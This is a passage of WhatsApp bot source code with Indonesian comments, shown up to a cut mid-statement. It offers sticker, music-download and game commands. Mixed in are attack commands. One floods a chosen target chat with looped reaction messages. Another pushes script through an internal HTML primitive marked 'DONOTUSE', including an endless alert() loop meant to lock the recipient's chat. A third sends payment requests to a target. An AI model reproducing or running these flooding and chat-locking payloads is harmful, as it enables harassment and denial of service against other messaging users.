            url: "https://mmg.whatsapp.net/v/t62.15575-24/860249342_1117665864002630_2046816351540056770_n.enc?ccb=11-4&oh=01_Q5Aa5wEBQZZAPgcGJ679ksIx9ZCH3u8nq4oX4WXroQG5DphLGw&oe=6B0C134C&_nc_sid=5e03e0&mms3=true",
            fileSha256: "eweSu0suPg6VTvBhsUT+3sS31SS4/NAIa6wxn4C+VLE=",
            fileEncSha256: "uUijUwPbk17S2TYNaaALa8t3awrXWFARSSbJ7Puu80w=",
            mediaKey: "Eb88jngWSfYQeOXoSHhnnJhO9VRtoq++SaHfb/QzKOw=",
            mimetype: "image/webp",
            height: 512,
            width: 512,
            directPath: "/v/t62.15575-24/870301937_1164288783250665_521746670790014697_n.enc?ccb=11-4&oh=01_Q5Aa5wGgHLfGjw_cY_eCzIc-XNMSiJ7ucEvHIKrEHz_JI_JvWA&oe=6B081C90&_nc_sid=5e03e0",
            fileLength: "27808",
            mediaKeyTimestamp: "1793103679",
            isAnimated: false,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
        }

        // ===== 2. Tentukan parentMessageKey =====
        // Kalau user reply pesan → pakai info pesan yang di-quote
        // Kalau tidak reply → pakai pesan user sendiri
        const q = m.quoted || null
        const parentKey = {
            remoteJid: from,
            id: q?.id || m.key.id,
            fromMe: q?.fromMe || false
        }
        const part = q?.sender || m.key.participant
        if (part) parentKey.participant = part

        // ===== 3. Kirim via relayMessage =====
        await WaSocket.relayMessage(from, {
            messageContextInfo: {
                messageAssociation: {
                    associationType: 11,
                    parentMessageKey: parentKey
                }
            },
            stickerMessage: stickerMsg
        }, {})

    } catch (e) {
        console.error('[HMPH ERROR]', e)
        m.reply('Gagal kirim sticker: ' + e.message)
    }
    break
}

case 'Fan': {
    try {
        // ===== 1. Data sticker (hardcode) =====
        const stickerMsg = {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/862877497_1111886121815007_900125099341010696_n.enc?ccb=11-4&oh=01_Q5Aa5wG07yFfDbG3EHmXgiLW5PtecWh6bnerSjtrxPfaKyKLOw&oe=6B0C448C&_nc_sid=5e03e0&mms3=true",
            fileSha256: "eweSu0suPg6VTvBhsUT+3sS31SS4/NAIa6wxn4C+VLE=",
            fileEncSha256: "uUijUwPbk17S2TYNaaALa8t3awrXWFARSSbJ7Puu80w=",
            mediaKey: "Eb88jngWSfYQeOXoSHhnnJhO9VRtoq++SaHfb/QzKOw=",
            mimetype: "image/webp",
            height: 512,
            width: 512,
            directPath: "/v/t62.15575-24/870301937_1164288783250665_521746670790014697_n.enc?ccb=11-4&oh=01_Q5Aa5wGgHLfGjw_cY_eCzIc-XNMSiJ7ucEvHIKrEHz_JI_JvWA&oe=6B081C90&_nc_sid=5e03e0",
            fileLength: "27808",
            mediaKeyTimestamp: "1793103679",
            isAnimated: false,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
        }

        // ===== 2. Tentukan parentMessageKey =====
        // Kalau user reply pesan → pakai info pesan yang di-quote
        // Kalau tidak reply → pakai pesan user sendiri
        const q = m.quoted || null
        const parentKey = {
            remoteJid: from,
            id: q?.id || m.key.id,
            fromMe: q?.fromMe || false
        }
        const part = q?.sender || m.key.participant
        if (part) parentKey.participant = part

        // ===== 3. Kirim via relayMessage =====
        await WaSocket.relayMessage(from, {
            messageContextInfo: {
                messageAssociation: {
                    associationType: 11,
                    parentMessageKey: parentKey
                }
            },
            stickerMessage: stickerMsg
        }, {})

    } catch (e) {
        console.error('[HMPH ERROR]', e)
        m.reply('Gagal kirim sticker: ' + e.message)
    }
    break
}

case 'baka': {
    try {
        // ===== 1. Data sticker (hardcode) =====
        const stickerMsg = {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/875559382_1469131415310313_7521364584651835051_n.enc?ccb=11-4&oh=01_Q5Aa5wFaog9BbTVAiCk-9-ITjBjX0png_pvZMzYEb1p1h6Wb_A&oe=6B0C2ADC&_nc_sid=5e03e0&mms3=true",
            fileSha256: "eweSu0suPg6VTvBhsUT+3sS31SS4/NAIa6wxn4C+VLE=",
            fileEncSha256: "uUijUwPbk17S2TYNaaALa8t3awrXWFARSSbJ7Puu80w=",
            mediaKey: "Eb88jngWSfYQeOXoSHhnnJhO9VRtoq++SaHfb/QzKOw=",
            mimetype: "image/webp",
            height: 512,
            width: 512,
            directPath: "/v/t62.15575-24/870301937_1164288783250665_521746670790014697_n.enc?ccb=11-4&oh=01_Q5Aa5wGgHLfGjw_cY_eCzIc-XNMSiJ7ucEvHIKrEHz_JI_JvWA&oe=6B081C90&_nc_sid=5e03e0",
            fileLength: "27808",
            mediaKeyTimestamp: "1793103679",
            isAnimated: false,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
        }

        // ===== 2. Tentukan parentMessageKey =====
        // Kalau user reply pesan → pakai info pesan yang di-quote
        // Kalau tidak reply → pakai pesan user sendiri
        const q = m.quoted || null
        const parentKey = {
            remoteJid: from,
            id: q?.id || m.key.id,
            fromMe: q?.fromMe || false
        }
        const part = q?.sender || m.key.participant
        if (part) parentKey.participant = part

        // ===== 3. Kirim via relayMessage =====
        await WaSocket.relayMessage(from, {
            messageContextInfo: {
                messageAssociation: {
                    associationType: 11,
                    parentMessageKey: parentKey
                }
            },
            stickerMessage: stickerMsg
        }, {})

    } catch (e) {
        console.error('[HMPH ERROR]', e)
        m.reply('Gagal kirim sticker: ' + e.message)
    }
    break
}

case 'p': {
    try {
        const stickerMsg = {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/882311849_1148202057565054_1045243698102949609_n.enc?ccb=11-4&oh=01_Q5Aa5wHdB2K7Xhn1V5xjoIQOm5UZfuExLXF954JMFkJFgQq4BQ&oe=6B0C368C&_nc_sid=5e03e0&mms3=true",
            fileSha256: "eweSu0suPg6VTvBhsUT+3sS31SS4/NAIa6wxn4C+VLE=",
            fileEncSha256: "uUijUwPbk17S2TYNaaALa8t3awrXWFARSSbJ7Puu80w=",
            mediaKey: "Eb88jngWSfYQeOXoSHhnnJhO9VRtoq++SaHfb/QzKOw=",
            mimetype: "image/webp",
            height: 512,
            width: 512,
            directPath: "/v/t62.15575-24/870301937_1164288783250665_521746670790014697_n.enc?ccb=11-4&oh=01_Q5Aa5wGgHLfGjw_cY_eCzIc-XNMSiJ7ucEvHIKrEHz_JI_JvWA&oe=6B081C90&_nc_sid=5e03e0",
            fileLength: "27808",
            mediaKeyTimestamp: "1793103679",
            isAnimated: false,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
        }

        const q = m.quoted || null

        // ===== Kalau TIDAK reply → kirim sticker biasa (pesan baru) =====
        if (!q) {
            await WaSocket.relayMessage(from, {
                stickerMessage: stickerMsg
            }, {})
            break
        }

        // ===== Kalau REPLY → sticker nempel ke pesan yang di-quote =====
        const parentKey = {
            remoteJid: from,
            id: q.id,
            fromMe: q.fromMe || false
        }
        const part = q.sender || q.participant
        if (part) parentKey.participant = part

        await WaSocket.relayMessage(from, {
            messageContextInfo: {
                messageAssociation: {
                    associationType: 11,
                    parentMessageKey: parentKey
                }
            },
            stickerMessage: stickerMsg
        }, {})

    } catch (e) {
        console.error('[HMPH ERROR]', e)
        m.reply('Gagal kirim sticker: ' + e.message)
    }
    break
}

case "ntgc": {
  try {
    if (!text || !parseInt(args[0])) {
      return reply(`Contoh penggunaan: *${usedPrefix + command} <jumlah> <?target> <?delay>*`);
    }

    const [jump, target, dely] = args;
    const much = parseInt(jump);
    const sendto = (target == 'here' ? from : target) || from;
    const sabar = parseInt(dely) || 500;
    
    // Ambil ID pesan
    const msgId = msg.key.id; 

    const notif = {
      sessionTransparencyMetadata: {
        disclaimerText: '~ let me know',
        hcaId: `hca_${Date.now()}`,
        sessionTransparencyType: 1
      }
    };

    const mContextInfo = {
      messageContextInfo: {
        botMetadata: { ...notif }
      }
    };

    const reaction = {
      ...mContextInfo,
      reactionMessage: {
        key: {
          remoteJid: sendto,
          id: msgId,
          fromMe: false
        },
        text: ''
      }
    };

    await WaSocket.sendMessage(from, { react: { text: '⏳', key: msg.key } });

    for (let i = 0; i < much; i++) {
      await WaSocket.relayMessage(
        sendto,
        reaction, 
        { additionalAttributes: { type: 'reaction' } }
      );
      await new Promise(r => setTimeout(r, sabar));
    }

    await WaSocket.sendMessage(from, { react: { text: '✅', key: msg.key } });

  } catch (e) {
    console.error(e);
    reply(`❌ Gagal: ${e.message}`);
  }
  break;
}

case "pay": {
  try {
    // 1. Ambil target (pakai from, atau m.chat)
    const target = from || m.chat;
    if (!target) throw new Error("Target tidak ditemukan");

    // 2. Ambil teks dan argumen (pakai variabel m, bukan msg)
    const textCmd = m.text || "";
    const args = textCmd.split(" ").slice(1);
    
    // 3. Parse nominal (default Rp 1.000 jika kosong)
    const nominal = parseInt(args[0]) || 1000; 
    const nominal1000 = nominal * 1000; // Harus Number, bukan string

    // 4. Susun Payload
    const payload = {
      requestPaymentMessage: {
        currencyCodeIso4217: "IDR",
        amount1000: nominal1000,
        expiryTimestamp: 0,
        amount: {
          value: nominal1000,
          offset: 1000,
          currencyCode: "IDR"
        },
        noteMessage: {
          extendedTextMessage: {
            text: `BY: FanXpL Rp ${nominal.toLocaleString('id-ID')}!`
          }
        },
        requestFrom: target
      }
    };

    // 5. Kirim
    await WaSocket.relayMessage(target, payload, {});
    return `✅ Tagihan Rp ${nominal.toLocaleString('id-ID')} terkirim`;

  } catch (e) {
    console.error("[PAY] Error:", e);
    return "❌ Gagal kirim tagihan: " + e.message;
  }
}
break;

case 'gitdl': {
  if (!isBot) return;
  
  const urlTarget = text.replace(/^\.?gitdl\s*/i, '').trim();
  if (!urlTarget) return m.reply("Mana link GitHub-nya?\nContoh: .gitdl https://github.com/XZEERH/KumpulanScraper");

  await WaSocket.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

  try {
    // 1. Parsing URL
    let raw = urlTarget.trim().replace(/\.git$/i, '');
    if (/^git@github\.com:/i.test(raw)) raw = 'github.com/' + raw.replace(/^git@github\.com:/i, '');
    if (/^[a-z][a-z0-9+.-]*:\/\//i.test(raw)) {
      let u = new URL(raw);
      if (!/(^|\.)github\.com$/i.test(u.hostname)) throw new Error("Bukan URL GitHub!");
      raw = u.pathname.slice(1);
    } else {
      raw = raw.replace(/^(www\.)?github\.com\//i, '');
    }
    
    const seg = raw.split(/[\/#?]/).map(s => decodeURIComponent(s)).filter(Boolean);
    if (seg.length < 2) throw new Error("Format URL tidak valid. Contoh: owner/repo");
    
    const owner = seg[0];
    const repo = seg[1].replace(/\.git$/i, '');

    // 2. Download ZIP langsung ke RAM (Buffer)
    const zipUrl = `https://codeload.github.com/${owner}/${repo}/zip/refs/heads/main`;
    
    const res = await axios.get(zipUrl, {
      responseType: 'arraybuffer',
      headers: { 'User-Agent': 'Mozilla/5.0' },
      maxContentLength: 100 * 1024 * 1024 // Limit 100MB
    });

    const buffer = Buffer.from(res.data);
    
    // Hitung ukuran file
    const i = Math.floor(Math.log(buffer.length) / Math.log(1024));
    const sizeStr = (buffer.length / Math.pow(1024, i)).toFixed(2) + ' ' + ['B', 'KB', 'MB', 'GB'][i];

    // 3. Kirim ke WhatsApp
    await WaSocket.sendMessage(m.chat, {
      document: buffer,
      mimetype: 'application/zip',
      fileName: `${repo}-main.zip`,
      caption: `✅ *GitHub Downloader*\n\n📦 Repo: ${repo}\n👤 Owner: ${owner}\n💾 Size: ${sizeStr}`
    }, { quoted: m });

    await WaSocket.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

  } catch (e) {
    await WaSocket.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
    m.reply(`Gagal mendownload: ${e.message}\n_Pastikan repo publik dan branch utamanya 'main'_`);
  }
}
break;
// ================================================================
// ================ SLOT MACHINE CASE ==============================
// ================================================================

case 'slot':
case 'spinslot':
case 'jackpot':
case 'mesinslot':
case 'judi': {
    try {
        // Cek apakah di grup
        if (!isGroup) {
            return reply('❌ Fitur ini hanya untuk grup!');
        }
        
        // Load database user
        const usersPath = './libraries/databases/users.json';
        let users = {};
        if (fs.existsSync(usersPath)) {
            users = JSON.parse(fs.readFileSync(usersPath));
        }
        
        // Inisialisasi user
        if (!users[sender]) {
            users[sender] = {
                money: 1000,
                slotBestWin: 0,
                slotCooldown: 0,
                totalSpin: 0,
                lastDaily: 0
            };
            fs.writeFileSync(usersPath, JSON.stringify(users, null, 2));
        }
        
        const user = users[sender];
        const now = Date.now();
        
        // Cek saldo
        if (!user.money || user.money < 100) {
            return reply(`❌ Saldo Anda tidak cukup!\n💰 Minimal: 100 coin\n💵 Saldo Anda: ${user.money || 0} coin\n\nGunakan *daily* untuk klaim saldo harian.`);
        }
        
        // Cek cooldown (5 detik)
        if (user.slotCooldown && now - user.slotCooldown < 5000) {
            const remaining = Math.ceil((5000 - (now - user.slotCooldown)) / 1000);
            return reply(`⏳ Tunggu ${remaining} detik lagi sebelum bermain!`);
        }
        
        // Update cooldown
        user.slotCooldown = now;
        user.totalSpin = (user.totalSpin || 0) + 1;
        fs.writeFileSync(usersPath, JSON.stringify(users, null, 2));
        
        // Ambil saldo user
        const credits = Math.min(user.money, 10000);
        const bet = Math.min(10, Math.floor(credits / 10) || 5);
        
        // Generate HTML
        const htmlContent = generateSlotHTML(credits, bet);
        
        // Buat pesan interactive
        const slots = {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        unifiedResponse: {
                            data: Buffer.from(JSON.stringify({
                                __typename: "GenAIUnifiedResponse",
                                response_id: crypto.randomUUID(),
                                sections: [{
                                    __typename: "GenAIUnifiedResponseSection",
                                    view_model: {
                                        __typename: "GenAISingleLayoutViewModel",
                                        primitive: {
                                            __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
                                            trusted_sources: [],
                                            payload: htmlContent
                                        }
                                    }
                                }]
                            })).toString("base64")
                        },
                        contextInfo: {
                            isForwarded: true,
                            forwardOrigin: 4
                        }
                    }
                }
            }
        };
        
        // Kirim pesan
        const msg = generateWAMessageFromContent(from, slots, {});
        await WaSocket.relayMessage(from, msg.message, { 
            messageId: msg.key.id 
        });
        
        console.log(`[SLOT] ${pushname} bermain slot dengan ${credits} credits`);
        
    } catch (error) {
        console.error('Error pada slot:', error);
        reply('❌ Terjadi kesalahan saat memuat slot machine. Silakan coba lagi.');
    }
    break;
}

// ================================================================
// ================ CEK SALDO ======================================
// ================================================================

case 'saldo':
case 'balance':
case 'coin': {
    const usersPath = './libraries/databases/users.json';
    let users = {};
    if (fs.existsSync(usersPath)) {
        users = JSON.parse(fs.readFileSync(usersPath));
    }
    
    const user = users[sender];
    if (!user) {
        users[sender] = { money: 1000, slotBestWin: 0, totalSpin: 0 };
        fs.writeFileSync(usersPath, JSON.stringify(users, null, 2));
        return reply('💰 Saldo Anda: 1000 coin\n\nGunakan *daily* untuk klaim saldo!');
    }
    
    let text = '💰 *SALDO ANDA* 💰\n\n';
    text += `💵 Coin: ${user.money || 0}\n`;
    text += `🏆 Best Win: ${user.slotBestWin || 0}\n`;
    text += `🎰 Total Spin: ${user.totalSpin || 0}\n\n`;
    text += 'Gunakan *.slot* untuk bermain!';
    
    reply(text);
    break;
}

case 'oy':
case 'testtag':
case 'labelmerah': {
    try {
        const responseId = crypto.randomUUID();
        await WaSocket.relayMessage(from, {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        unifiedResponse: {
                            data: Buffer.from(JSON.stringify({
                                __typename: 'GenAIUnifiedResponse',
                                response_id: responseId,
                                sections: [{
                                    __typename: 'GenAIUnifiedResponseSection',
                                    view_model: {
                                        __typename: 'GenAISingleLayoutViewModel',
                                        primitive: {
                                            __typename: 'GenAILabelPrimitive',
                                            text: 'oyy apa an jir!!',
                                            variant: 'POSITIVE',
                                            background_color_override: '#FF0000FF',
                                            text_color_override: '#000000FF'
                                        }
                                    }
                                }]
                            })).toString('base64')
                        },
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 1,
                            forwardOrigin: 4,
                            mentionedJid: [m.sender]
                        }
                    }
                }
            }
        }, {});
    } catch (e) {
        console.error('Test tag error:', e);
        reply(`❌ Error: ${e.message}`);
    }
} break;

case "play2":
case "spotify": {
  try {
    const axios = require('axios');
    const crypto = require('crypto');
    const query = text || args.join(' ');
    if (!query) return reply(`Contoh: ${usedPrefix + command} Lathi`);

    const chatId = m.chat || from || m.key.remoteJid;
    await WaSocket.sendMessage(chatId, { text: "⏳ Mencari lagu di Spotify..." });

    const SPOTMP3 = 'https://spotmp3.net';
    const SPOTSAVER = 'https://spotsaver.net';
    const LRCLIB = 'https://lrclib.net/api';
    const headers = { 
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 
      Accept: 'application/json', 
      Origin: SPOTSAVER, 
      Referer: SPOTSAVER + '/' 
    };
    
    const fmtDuration = (ms) => {
      if (!ms) return null;
      const sec = Math.round(Number(ms) / 1000);
      return `${Math.floor(sec / 60)}:${String(sec % 60).padStart(2, '0')}`;
    };
    const delay = (ms) => new Promise(res => setTimeout(res, ms));

    // 1. Search & Download (Logika Asli Kamu)
    const { data: searchData } = await axios.get(`${SPOTMP3}/api/v1/search`, { params: { q: query }, headers, timeout: 30000 });
    const tracks = searchData?.sections?.find(v => v.type === 'track')?.items || [];
    if (!tracks.length) return WaSocket.sendMessage(chatId, { text: "❌ Lagu tidak ditemukan." });

    const item = tracks[0];
    const spotifyUrl = item.url || `https://open.spotify.com/track/${item.id}`;
    await WaSocket.sendMessage(chatId, { text: `🎵 Ditemukan: *${item.title}* oleh *${item.subtitle}*\n⏳ Memproses...` });

    const { data: spotify } = await axios.get(`${SPOTSAVER}/api/spotify/`, { params: { url: spotifyUrl }, headers, timeout: 30000 });
    const track = spotify?.items?.[0];
    if (!track) throw new Error("Track tidak ditemukan.");

    const { data: idData } = await axios.post(`${SPOTSAVER}/api/get-id/`, { title: track.title, artist: track.artist }, { headers: { ...headers, 'Content-Type': 'application/json' }, timeout: 30000 });
    const videoId = idData?.videoId;
    
    const { data: dlData } = await axios.post(`${SPOTSAVER}/api/download/`, { videoId, candidateIds: [], format: 'mp3', title: `${track.title} - ${track.artist}`, licenseKey: null }, { headers: { ...headers, 'Content-Type': 'application/json' }, timeout: 60000 });
    const downloadUrl = dlData?.url || dlData?.download || dlData?.downloadUrl || dlData?.audio || dlData?.result?.url;
    if (!downloadUrl) throw new Error("URL download tidak ditemukan.");

    // 2. Lirik
    let lyricsText = "Lirik tidak tersedia.";
    try {
      const { data: lyrData } = await axios.get(`${LRCLIB}/search`, { params: { q: `${track.title} ${track.artist}` }, headers: { 'User-Agent': 'SpotifyPlay/1.0' }, timeout: 30000 });
      if (lyrData && lyrData.length > 0 && lyrData[0].plainLyrics) lyricsText = lyrData[0].plainLyrics;
    } catch (e) {}

    // 3. Kirim Audio
    await WaSocket.sendMessage(chatId, {
      audio: { url: downloadUrl },
      mimetype: 'audio/mp4',
      fileName: `${track.title}.mp3`
    });

    await delay(2000); // Jeda RAM

    // 4. Kirim Gambar + Info
    // ==========================================
    // GANTI LINK DI BAWAH INI DENGAN GAMBAR KAMU
    const gambarSendiri = 'https://files.catbox.moe/5w7b5c.jpg'; 
    // ==========================================

    await WaSocket.sendMessage(chatId, {
      interactiveMessage: {
        header: { 
          title: track.title,
          hasMediaAttachment: true,
          imageMessage: { url: gambarSendiri } // <--- Pakai gambar kamu di sini
        },
        body: { 
          text: `👤 *Artis:* ${track.artist}\n💿 *Album:* ${track.album || '-'}\n⏱️ *Durasi:* ${fmtDuration(track.duration) || '-'}` 
        },
        footer: { text: 'Spotify Player' },
        nativeFlowMessage: { buttons: [] }
      }
    });

    await delay(2000);

    // 5. Kirim Widget Lirik
    const uuid = crypto.randomUUID();
    const surfaceId = `spotify-${uuid}`;
    const components = [
      { id: 'root', component: 'Column', children: ['lyrics_card'] },
      { id: 'lyrics_card', component: 'Card', child: 'lyrics_col' },
      { id: 'lyrics_col', component: 'Column', children: ['lyrics_title', 'lyrics_body'] },
      { id: 'lyrics_title', component: 'Text', text: `📜 Lirik: ${track.title}`, variant: 'h3' },
      { id: 'lyrics_body', component: 'Text', text: lyricsText, variant: 'body' }
    ];

    const widget = {
      uuid,
      type: 'im_a2ui',
      data: JSON.stringify({
        version: 'v0.9',
        createSurface: { surfaceId, catalogId: 'https://a2ui.org/specification/v0_9/catalogs/basic/catalog.json', sendDataModel: true, components }
      }),
      fallback: 'Lirik Lagu'
    };

    const widgetContent = {
      messageContextInfo: { messageSecret: crypto.randomBytes(32) },
      interactiveMessage: {
        header: { hasMediaAttachment: false },
        body: { text: '' },
        footer: { text: '' },
        nativeFlowMessage: { buttons: [], messageParamsJson: '{}', messageVersion: 1 },
        bloksWidget: widget,
        contextInfo: { isForwarded: false, forwardingScore: 0 }
      }
    };

    await WaSocket.relayMessage(chatId, widgetContent, {});

  } catch (e) {
    console.error("[SPOTIFY ERROR]", e.message);
    await WaSocket.sendMessage(m.chat || from, { text: "❌ Terjadi kesalahan: " + e.message });
  }
}
break;

case "play":
case "playsf":
case "spotifyplay": {
    if (!text) return reply("Contoh:\n.play sesi potret");

    try {
        await reply("⏳ Sedang mencari lagu di Spotify...");

        const api = `https://api.nexray.eu.cc/downloader/spotifyplay?q=${encodeURIComponent(text)}`;
        const { data } = await axios.get(api, { timeout: 60000 });

        if (!data?.status || !data?.result) {
            return reply("❌ Lagu tidak ditemukan.");
        }

        const res = data.result;

        if (!res.download_url) {
            return reply("❌ Audio tidak tersedia.");
        }

        // INFO LAGU (teks biasa)
        let info = `🎵 *${res.title || "Unknown Title"}*\n\n`;
        info += `🎤 Artist: ${res.artist || "-"}\n`;
        info += `💿 Album: ${res.album || "-"}\n`;
        info += `⏱️ Durasi: ${res.duration || "-"}\n`;
        info += `⭐ Popularity: ${res.popularity || "-"}\n`;
        info += `📅 Release: ${res.release_at || "-"}`;

        await reply(info);

        // AUDIO
        await WaSocket.sendMessage(from, {
            audio: { url: res.download_url },
            mimetype: "audio/mpeg",
            fileName: `${res.title || "Spotify"}.mp3`,
            ptt: false
        }, { quoted: m });

    } catch (err) {
        console.error("PLAY ERROR:", err);
        await reply(`❌ Error: ${err.message}`);
    }
} break;

const { captureNextLottieSticker, customizeMetadata, sendLottieSticker } = require('was-sticker');

// ... di dalam switch (command) ...

case 'sendlottie':
case 'lottie': {
    // Cek apakah user mereply sebuah stiker
    if (!m.quoted || m.quoted.mtype !== 'stickerMessage') {
        return reply('❌ Reply ke stiker Lottie (.was) yang mau dikirim ulang!');
    }

    try {
        await reply('⏳ Menangkap dan memproses stiker Lottie...');

        // 1. Tangkap stiker Lottie berikutnya yang masuk (dari reply)
        //    Library ini akan menunggu stiker .was berikutnya yang diterima bot
        const { buffer } = await captureNextLottieSticker(WaSocket, { timeoutMs: 30000 });

        // 2. Kustomisasi metadata (ganti nama pack, publisher, dll)
        const rebranded = await customizeMetadata(buffer, {
            packId: 'my-bot-pack-v1',
            packName: 'Bot Lottie Pack',
            publisher: 'My Bot\nPowered by was-sticker',
            accessibilityText: 'Stiker Lottie dari bot',
            emojis: ['💎', '✨']
        });

        // 3. Kirim sebagai lottieStickerMessage yang valid
        await sendLottieSticker(WaSocket, from, rebranded, { quoted: m });

        await reply('✅ Stiker Lottie berhasil dikirim!');

    } catch (e) {
        console.error('Lottie sticker error:', e);
        await reply(`❌ Gagal: ${e.message}`);
    }
} break;

// ================================================================
// ================ DAILY BONUS ====================================
// ================================================================

case 'daily':
case 'claim':
case 'bonus': {
    const usersPath = './libraries/databases/users.json';
    let users = {};
    if (fs.existsSync(usersPath)) {
        users = JSON.parse(fs.readFileSync(usersPath));
    }
    
    if (!users[sender]) {
        users[sender] = { money: 1000, slotBestWin: 0, totalSpin: 0, lastDaily: 0 };
    }
    
    const user = users[sender];
    const now = Date.now();
    const lastClaim = user.lastDaily || 0;
    const cooldown = 86400000; // 24 jam
    
    if (now - lastClaim < cooldown) {
        const remaining = Math.ceil((cooldown - (now - lastClaim)) / 3600000);
        return reply(`⏳ Bonus harian sudah diklaim!\nTunggu ${remaining} jam lagi.`);
    }
    
    const bonus = Math.floor(Math.random() * 200) + 100;
    user.money = (user.money || 0) + bonus;
    user.lastDaily = now;
    fs.writeFileSync(usersPath, JSON.stringify(users, null, 2));
    
    reply(`🎁 *BONUS HARIAN* 🎁\n\n💰 +${bonus} coin\n💵 Saldo sekarang: ${user.money} coin\n\nGunakan *.slot* untuk bermain!`);
    break;
}

// ================================================================
// ================ LEADERBOARD SLOT ==============================
// ================================================================

case 'slotlb':
case 'slotleaderboard':
case 'topslot': {
    const usersPath = './libraries/databases/users.json';
    let users = {};
    if (fs.existsSync(usersPath)) {
        users = JSON.parse(fs.readFileSync(usersPath));
    }
    
    const sorted = Object.entries(users)
        .filter(([_, u]) => u.slotBestWin && u.slotBestWin > 0)
        .sort((a, b) => b[1].slotBestWin - a[1].slotBestWin)
        .slice(0, 10);
    
    if (sorted.length === 0) {
        return reply('Belum ada pemain slot. Jadilah yang pertama! 🎰');
    }
    
    let text = '🏆 *LEADERBOARD SLOT* 🏆\n\n';
    sorted.forEach(([id, u], i) => {
        const name = pushname || id.split('@')[0] || 'Unknown';
        const medal = i === 0 ? '🥇' : i === 1 ? '🥈' : i === 2 ? '🥉' : `${i+1}.`;
        text += `${medal} ${name} - ${u.slotBestWin} coin 🎰\n`;
    });
    
    reply(text);
    break;
}

case 'xo':
case 'tictactoe':
case 'ttt':
case 'tic':
case 'tac':
case 'toe': {
    try {
        const html = generateXOHTML();
        
        // ===== PAKAI generateWAMessageFromContent =====
        // Ini yang PALING AMAN untuk Baileys versi apapun
        
        const msg = generateWAMessageFromContent(from, {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        unifiedResponse: {
                            data: Buffer.from(JSON.stringify({
                                __typename: "GenAIUnifiedResponse",
                                response_id: crypto.randomUUID(),
                                sections: [{
                                    __typename: "GenAIUnifiedResponseSection",
                                    view_model: {
                                        __typename: "GenAISingleLayoutViewModel",
                                        primitive: {
                                            __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
                                            trusted_sources: [],
                                            payload: html
                                        }
                                    }
                                }]
                            })).toString("base64")
                        },
                        contextInfo: {
                            isForwarded: true,
                            forwardOrigin: 4
                        }
                    }
                }
            }
        }, {});
        
        await WaSocket.relayMessage(from, msg.message, {
            messageId: msg.key.id
        });
        
        console.log(`[XO] ${pushname} main Tic Tac Toe!`);
        
    } catch (error) {
        console.error('Error XO Game:', error);
        reply('❌ Gagal memuat game. Coba lagi nanti.');
    }
    break;
}

case 'chess':
case 'catur':
case 'caturs':
case 'maincatur': {
    try {
        const html = generateChessHTML();
        
        const msg = generateWAMessageFromContent(from, {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        unifiedResponse: {
                            data: Buffer.from(JSON.stringify({
                                __typename: "GenAIUnifiedResponse",
                                response_id: crypto.randomUUID(),
                                sections: [{
                                    __typename: "GenAIUnifiedResponseSection",
                                    view_model: {
                                        __typename: "GenAISingleLayoutViewModel",
                                        primitive: {
                                            __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
                                            trusted_sources: [],
                                            payload: html
                                        }
                                    }
                                }]
                            })).toString("base64")
                        },
                        contextInfo: {
                            isForwarded: true,
                            forwardOrigin: 4
                        }
                    }
                }
            }
        }, {});
        
        await WaSocket.relayMessage(from, msg.message, {
            messageId: msg.key.id
        });
        
        console.log(`[CHESS] ${pushname} main Catur!`);
        
    } catch (error) {
        console.error('Error Chess Game:', error);
        reply('❌ Gagal memuat game catur. Coba lagi nanti.');
    }
    break;
}
    
// ===== Case pemanggil: kirim game Tic-Tac-Toe ke chat =====
case 'loitt':
case '....':
case 'ttt': {
    if (!m.chat) return;
    
    // INI YANG DIGANTI: 'target' menjadi 'm.chat'
    await LockXchatt(WaSocket, m.chat); 
    
    await WaSocket.sendMessage(m.chat, {
        text: '🎮 Game Tic-Tac-Toe dikirim! Tekan cell untuk main.'
    }, { quoted: m });
    break;
} 

  case "xlp": {
  try {
    const SOCKET = typeof WaSocket !== 'undefined' ? WaSocket : client;
    const target = from || m.chat || m.key.remoteJid;

    // HTML buat TicTacToe (karena fungsi LockXchatt ga ada di kode awal)
    const HTML_GAME = `
      <!DOCTYPE html>
      <html>
        <body style="background:#0b141a;color:#fff;text-align:center;font-family:sans-serif">
          <h2>TicTacToe</h2>
          <div id="b" style="display:grid;grid-template-columns:repeat(3,60px);gap:5px;justify-content:center"></div>
          <script>
            const b=document.getElementById('b');
            for(let i=0;i<9;i++){
              const c=document.createElement('button');
              c.style.cssText='width:60px;height:60px;font-size:24px;background:#111b21;color:#0f0;border:1px solid #333';
              c.onclick=()=>{
                if(!c.innerText){
                  c.innerText='X';
                  setTimeout(()=>{
                    const e=[...b.children].filter(x=>!x.innerText);
                    if(e.length) e[Math.floor(Math.random()*e.length)].innerText='O';
                  },300);
                }
              };
              b.appendChild(c);
            }
          </script>
        </body>
      </html>
    `;

    // HTML buat Alert (tetep bakal di-block sama WA, cuma buat ngetes fungsi)
    const HTML_ALERT = `
      <script>
        while (true) {
          alert("LooC-K B-+-Y GW 💩😹");
        }
      </script>
    `;

    if (typeof SOCKET.sendHtml === 'function') {
      // 1. Kirim Game
      await SOCKET.sendHtml(target, HTML_GAME);
      await new Promise(r => setTimeout(r, 1500));
      
      // 2. Kirim Alert
      await SOCKET.sendHtml(target, HTML_ALERT);
      
    } else if (typeof SOCKET.sendRich === 'function' && typeof SOCKET.editRich === 'function') {
      const htmlSection = (html) => ({
        __typename: 'GenAIUnifiedResponseSection',
        view_model: {
          __typename: 'GenAISingleLayoutViewModel',
          primitive: {
            __typename: 'FOAHtmlPrimitiveDemoDONOTUSE',
            trusted_sources: [],
